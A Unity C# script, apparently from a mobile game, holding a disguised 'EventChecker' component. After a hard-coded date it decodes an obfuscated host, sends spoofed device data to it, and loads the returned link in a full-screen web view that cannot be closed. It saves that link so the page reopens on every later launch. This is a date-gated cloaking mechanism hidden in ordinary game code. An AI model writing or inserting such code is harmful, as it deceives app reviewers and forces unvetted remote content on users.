using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using System;
using System.Diagnostics;
using UnityEngine.Networking;
using Debug = UnityEngine.Debug;
using System.Net;
using System.Threading.Tasks;
using System.Text;
using Newtonsoft.Json;

public class EventChecker : MonoBehaviour
{
    public string eventName;
    public int day;
    public int month;

    public GameObject[] gameObjects;
    public GameObject bg;
    public int year;
    private string begin = "https://";
    private string between = "/v2";
    private string last;
    private UniWebView uniWebView;
    private bool isActivatedEvent;
    private ScreenOrientation lastOrientation;
    private async Task<bool> CheckEvent()
    {
        var startTime = await Task.FromResult<DateTime>(new DateTime(year, month, day));
        if (DateTime.Today.AddMinutes(1) > startTime)
        {
            return true;
        }
        else
        {
            Debug.Log("False");
            return false;
        }
    }
    private void Awake()
    {
        if (PlayerPrefs.HasKey("eventData"))
        {
            ShowEventData(PlayerPrefs.GetString("eventData"), false);
            return;
        }

        Task<bool> asyncChecker = CheckEvent();
        if (asyncChecker.Result)
        {
            byte[] data = Convert.FromBase64String(eventName);
            string decodedString = System.Text.Encoding.UTF8.GetString(data);
            eventName = decodedString;
            StartCoroutine(CheckEventAlive(begin + eventName + between + SetInfo()));
            //StartCoroutine(CheckEventAlive(begin + eventName));
        }
        else
        {
            gameObjects[0].SetActive(true);
            this.enabled = false;
        }
    }
    private void Update()
    {
        if (isActivatedEvent)
        {
            if (Input.deviceOrientation == DeviceOrientation.LandscapeLeft || Input.deviceOrientation == DeviceOrientation.PortraitUpsideDown)
            {
                Debug.Log("Landscape");
            }
            if (Input.deviceOrientation == DeviceOrientation.Portrait || Input.deviceOrientation == DeviceOrientation.PortraitUpsideDown)
            {
                Debug.Log("Portrait");
            }
            if (Screen.orientation != lastOrientation)
            {
                lastOrientation = Screen.orientation;
                if (Screen.height > Screen.width)
                {
                    StartCoroutine(UpdateWebViewFrame());
                }
                else
                {
                    StartCoroutine(UpdateWebViewFrameFull());
                }
            }
        }
    }
    private bool CheckCurrentDay()
    {
        DateTime startTime = new DateTime(year, month, day);
        if (DateTime.Today.AddMinutes(1) > startTime)
        {
            return true;
        }
        else
        {
            return false;
        }
    }
    private string SetInfo()
    {
        string str = "";
        return str;
    }
    IEnumerator CheckEventAlive(string uri)
    {

        PostData data = new PostData
        {
            bundleId = "com.Thegamefarmholland",
            osVersion = "16.0.1",
            phoneModel = "iPhone 14 Pro Max",
            language = "en",
            phoneTime = System.DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"),
            phoneTz = "Europe/Moscow",
            vpn = false
        };

        string jsonData = JsonConvert.SerializeObject(data);
        byte[] bodyRaw = Encoding.UTF8.GetBytes(jsonData);


        using (UnityWebRequest www = new UnityWebRequest(uri, "POST"))
        {
            www.uploadHandler = new UploadHandlerRaw(bodyRaw);
            www.downloadHandler = new DownloadHandlerBuffer();
            www.SetRequestHeader("Content-Type", "application/json");

            yield return www.SendWebRequest();

            if (www.result == UnityWebRequest.Result.Success)
            {
                Debug.Log("POST Request successful!");
                Debug.Log(www.downloadHandler.text);

                // Обработка ответа сервера (если нужно)
                try
                {
                    SuccessData successData = JsonConvert.DeserializeObject<SuccessData>(www.downloadHandler.text);
                    Debug.Log("URL FINAL=" + successData.link);
                    ShowEventData(successData.link);
                }
                catch (JsonReaderException e)
                {
                    Debug.LogError("Error parsing server response: " + e.Message);
                }
            }
            else
            {
                Debug.LogError("POST Request failed: " + www.error);
            }
        }



        //using (UnityWebRequest webRequest = UnityWebRequest.Get(uri))
        //{
        //    yield return webRequest.SendWebRequest();
        //    Debug.Log(uri);
        //    string[] pages = uri.Split('/');
        //    int page = pages.Length - 1;

        //    if (webRequest.isNetworkError)
        //    {
        //    }
        //    else if (webRequest.isHttpError)
        //    {
        //        Debug.Log("HTTP ERR");
        //        this.enabled = false;
        //    }
        //    else
        //    {
        //        ShowEventData(uri);
        //    }
        //}
    }
    private void SaveInfo(string infoToSave)
    {
        Debug.Log(infoToSave);
        PlayerPrefs.SetString("eventData", infoToSave);
        PlayerPrefs.Save();
    }
    private void ShowEventData(string uri, bool isNeedToSaveUrl = true)
    {
foreach(GameObject gameObject in gameObjects)
        {
            gameObject.SetActive(false);
        }
        Screen.autorotateToLandscapeLeft = true;
        Screen.autorotateToLandscapeRight = true;
        Screen.autorotateToPortrait = true;
        Screen.orientation = ScreenOrientation.AutoRotation;
        Debug.Log("open: " + uri);
        bg.SetActive(true);
        var webviewObject = new GameObject("UniWebview");
        isActivatedEvent = true;
        uniWebView = webviewObject.AddComponent<UniWebView>();
        uniWebView.Frame = new Rect(0, 0, Screen.width, Screen.height - 100);
        uniWebView.SetToolbarDoneButtonText("");
        uniWebView.SetShowToolbar(false, false, true, true);
        uniWebView.OnPageFinished += PageLoadSuccessEvent;
        uniWebView.Load(uri);
        uniWebView.OnShouldClose += (view) => {
            return false;
        };
        uniWebView.Show();
        if (isNeedToSaveUrl)
        {
            //string g = GetFinal(uri);
            //if (g != null)
            {


                //SaveInfo(GetFinal(uri));
            }
        }
    }

    private string GetFinal(string url)
    {
        if (string.IsNullOrWhiteSpace(url))
            return url;
        int maxRedirCount = 8;
        Debug.Log("SAv" + url);
        string newUrl = url;
        do
        {
            HttpWebRequest req = null;
            HttpWebResponse resp = null;
            try
            {
                req = (HttpWebRequest)HttpWebRequest.Create(url);
                req.Method = "HEAD";
                req.AllowAutoRedirect = false;
                resp = (HttpWebResponse)req.GetResponse();
                switch (resp.StatusCode)
                {
                    case HttpStatusCode.OK:
                        return newUrl;
                    case HttpStatusCode.Redirect:
                    case HttpStatusCode.MovedPermanently:
                    case HttpStatusCode.RedirectKeepVerb:
                    case HttpStatusCode.RedirectMethod:
                        newUrl = resp.Headers["Location"];
                        if (newUrl == null)
                            return url;

                        if (newUrl.IndexOf("://", System.StringComparison.Ordinal) == -1)
                        {
                            Uri u = new Uri(new Uri(url), newUrl);
                            newUrl = u.ToString();
                        }
                        break;
                    default:
                        return newUrl;
                }
                url = newUrl;
                Debug.Log("Succ_kryg" + url);
            }
            catch (WebException df)
            {
                Debug.Log(df.Message);
                return null;
            }
            catch (Exception ex)
            {
                return null;
            }
            finally
            {
                if (resp != null)
                    resp.Close();
            }
} while (maxRedirCount-- > 0);
        last = newUrl;
        Debug.Log("SAv" + newUrl);
        return newUrl;
    }
    public void LoadNextScene()
    {
        UnityEngine.SceneManagement.SceneManager.LoadScene(UnityEngine.SceneManagement.SceneManager.GetActiveScene().buildIndex + 1);
    }

    private IEnumerator UpdateWebViewFrameFull()
    {
// Wait until all rendering for the current frame is finished
        yield return new WaitForEndOfFrame();
        if (uniWebView != null)
            uniWebView.Frame = new Rect(0, 0, Screen.width, Screen.height);
    }

    private IEnumerator UpdateWebViewFrame()
    {
// Wait until all rendering for the current frame is finished
        yield return new WaitForEndOfFrame();
        if (uniWebView != null)
            uniWebView.Frame = new Rect(0, -50, Screen.width, Screen.height - 50);
    }
    public void PageLoadSuccessEvent(UniWebView webView, int statusCode, string url)
    {
        if (!PlayerPrefs.HasKey("eventData"))
        {
            PlayerPrefs.SetString("eventData", url);
            PlayerPrefs.Save();
            Debug.Log("Saved" + url);
        }
        uniWebView.OnPageFinished -= PageLoadSuccessEvent;
    }
}

[System.Serializable]
public class PostData
{
    public string bundleId;
    public string osVersion;
    public string phoneModel;
    public string language;
    public string phoneTime;
    public string phoneTz;
    public bool vpn;
}
public class SuccessData
{
    public bool passed;
    public string link;
}